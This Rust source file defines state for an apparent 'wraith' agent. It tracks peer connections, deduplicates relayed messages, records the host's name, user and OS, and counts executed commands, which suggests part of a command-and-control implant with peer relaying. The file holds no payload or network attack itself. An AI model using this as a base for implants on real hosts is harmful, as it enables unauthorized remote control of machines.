use crate::relay::RelayManager;
use dashmap::DashSet;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use tokio::sync::{mpsc, oneshot};

#[derive(Clone)]
pub struct PeerConnection {
    pub wraith_id: String,
    pub hostname: String,
    pub connected_at: i64,
    pub sender: mpsc::Sender<crate::proto::wraith::WraithMessage>,
}

/// Result of checking a message for deduplication.
pub struct DedupResult {
    pub already_seen: bool,
    pub pending_tx: Option<oneshot::Sender<crate::proto::wraith::WraithMessage>>,
}

/// Tracks seen message IDs and pending responses for deduplication.
pub struct DedupState {
    seen_ids: DashSet<String>,
    pending_responses: std::sync::Mutex<HashMap<String, oneshot::Sender<crate::proto::wraith::WraithMessage>>>,
}

impl DedupState {
    pub fn new() -> Self {
        Self {
            seen_ids: DashSet::new(),
            pending_responses: std::sync::Mutex::new(HashMap::new()),
        }
    }

    pub fn has_seen(&self, message_id: &str) -> bool {
        self.seen_ids.contains(message_id)
    }

    pub fn mark_seen(&self, message_id: String) {
        self.seen_ids.insert(message_id);
    }

    pub fn register_pending(&self, message_id: String, tx: oneshot::Sender<crate::proto::wraith::WraithMessage>) {
        self.pending_responses.lock().expect("pending_responses lock poisoned").insert(message_id, tx);
    }

    pub fn take_pending(&self, message_id: &str) -> Option<oneshot::Sender<crate::proto::wraith::WraithMessage>> {
        self.pending_responses.lock().expect("pending_responses lock poisoned").remove(message_id)
    }

    /// Check if a message has been seen, returning any pending response sender.
    /// Marks as seen if this is the first time.
    pub fn check_and_mark(&self, msg_id: &str) -> DedupResult {
        let pending_tx = self.take_pending(msg_id);

        let already_seen = if self.seen_ids.contains(msg_id) {
            true
        } else {
            self.seen_ids.insert(msg_id.to_string());
            false
        };

        DedupResult {
            already_seen,
            pending_tx,
        }
    }
}

pub struct WraithState {
    pub relay_manager: Arc<Mutex<RelayManager>>,
    pub wraith_id: String,
    pub peer_table: HashMap<String, PeerConnection>,
    pub dedup: DedupState,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub ip_address: String,
    pub commands_executed: i64,
    pub last_command_time: i64,
    pub connected: bool,
}

impl WraithState {
    pub fn new(wraith_id: String, relay_manager: Arc<Mutex<RelayManager>>) -> Self {
        let hostname = hostname::get()
            .map(|h| h.to_string_lossy().to_string())
            .unwrap_or_else(|_| "unknown".to_string());

        let username = std::env::var("USER")
            .or_else(|_| std::env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown".to_string());

        Self {
            relay_manager,
            wraith_id,
            peer_table: HashMap::new(),
            dedup: DedupState::new(),
            hostname,
            username,
            os: std::env::consts::OS.to_string(),
            ip_address: "0.0.0.0".to_string(),
            commands_executed: 0,
            last_command_time: 0,
            connected: false,
        }
    }

    pub fn set_connected(&mut self, connected: bool) {
        self.connected = connected;
    }

    pub fn increment_commands(&mut self) {
        self.commands_executed += 1;
        self.last_command_time = chrono::Utc::now().timestamp_millis();
    }

    pub fn set_wraith_id(&mut self, id: String) {
        self.wraith_id = id;
    }

    pub fn add_peer(&mut self, wraith_id: String, hostname: String, sender: mpsc::Sender<crate::proto::wraith::WraithMessage>) {
        let connected_at = chrono::Utc::now().timestamp_millis();
        self.peer_table.insert(wraith_id.clone(), PeerConnection {
            wraith_id,
            hostname,
            connected_at,
            sender,
        });
    }

    pub fn remove_peer(&mut self, wraith_id: &str) -> Option<PeerConnection> {
        self.peer_table.remove(wraith_id)
    }

    pub fn has_seen_message(&self, message_id: &str) -> bool {
        self.dedup.has_seen(message_id)
    }

    pub fn mark_message_seen(&self, message_id: String) {
        self.dedup.mark_seen(message_id)
    }

    pub fn register_pending_response(&self, message_id: String, tx: oneshot::Sender<crate::proto::wraith::WraithMessage>) {
        self.dedup.register_pending(message_id, tx);
    }

    pub fn take_pending_response(&self, message_id: &str) -> Option<oneshot::Sender<crate::proto::wraith::WraithMessage>> {
        self.dedup.take_pending(message_id)
    }

    pub fn check_and_mark_seen(&self, msg_id: &str) -> DedupResult {
        self.dedup.check_and_mark(msg_id)
    }
}

impl Default for WraithState {
    fn default() -> Self {
        Self::new(
            uuid::Uuid::new_v4().to_string(),
            Arc::new(Mutex::new(RelayManager::new())),
        )
    }
}
